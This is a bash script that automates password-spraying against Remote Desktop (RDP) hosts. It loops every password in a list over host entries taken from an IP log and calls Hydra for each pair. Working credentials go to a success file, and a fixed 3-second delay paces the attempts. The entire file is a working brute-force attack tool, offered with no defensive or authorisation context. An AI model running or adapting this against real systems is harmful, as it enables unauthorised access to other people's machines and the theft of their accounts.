#!/bin/bash

# Define the input files
iplog_file="iplog.txt"
passwords_file="passwords.txt"
success_log_file="successful_logins.txt"

# Check if the input files exist
if [[ ! -f "$iplog_file" || ! -f "$passwords_file" ]]; then
    echo "One or both files do not exist, exiting."
    exit 1
fi

# Create or clear the success log file
> "$success_log_file"
> "hydra_debug.log"  # Clear debug log

# Read all RDP entries into an array
mapfile -t iplog_entries < "$iplog_file"

# Read all passwords into an array
mapfile -t passwords < "$passwords_file"

# Get the total number of attempts
total_attempts=$(( ${#iplog_entries[@]} * ${#passwords[@]} ))
current_attempt=0
successful_attempts=0
start_time=$(date +%s)

# Function to display progress
display_progress() {
    local elapsed_time=$1
    local current_attempt=$2
    local total_attempts=$3
    local successful_attempts=$4

    local percent=$(( (current_attempt * 100) / total_attempts ))
    echo "Progress: $current_attempt / $total_attempts ($percent%)"
    echo "Successful logins: $successful_attempts"
    echo "Time elapsed: $(date -u -d @$elapsed_time +%H:%M:%S)"
}

# Print initial static UI
tput clear
echo "Total Attempts: $total_attempts"
echo "----------------------------------------"
echo "Attempting logins..."

# Loop through each password
for password in "${passwords[@]}"; do
    if [[ -z "$password" ]]; then continue; fi

    # Loop through each RDP entry in iplog.txt
    for entry in "${iplog_entries[@]}"; do
        if [[ -z "$entry" ]]; then
            echo "Invalid entry in iplog: '$entry', skipping..."
            continue
        fi

        username=$(echo "$entry" | cut -d':' -f2 | cut -d'@' -f1) # Adjust as per your entry format

        # Run Hydra for each username and password pair, capturing output
        hydra_output=$(sudo hydra -l "$username" -p "$password" "$entry" rdp -t 1 -W 5)
        echo "$hydra_output" >> hydra_debug.log

        if echo "$hydra_output" | grep -q "login successful"; then
            echo "Successful login with $username on $entry using password: $password" >> "$success_log_file"
            successful_attempts=$((successful_attempts + 1))
        fi

        # Update current attempt count
        current_attempt=$((current_attempt + 1))
        
        # Introduce a delay based on the observed response time
        sleep 3  # Keep it at 3 seconds

        # Update elapsed time and display progress
        elapsed_time=$(( $(date +%s) - start_time ))
        display_progress "$elapsed_time" "$current_attempt" "$total_attempts" "$successful_attempts"
    done
done

# Final output
elapsed_time=$(( $(date +%s) - start_time ))
echo -ne "\n----------------------------------------\n"
echo "Completed processing all entries in $iplog_file."
echo "Total Attempts: $total_attempts"
echo "Successful Logins: $(wc -l < $success_log_file)"
echo "Time Used: $(date -u -d @$elapsed_time +%H:%M:%S)"
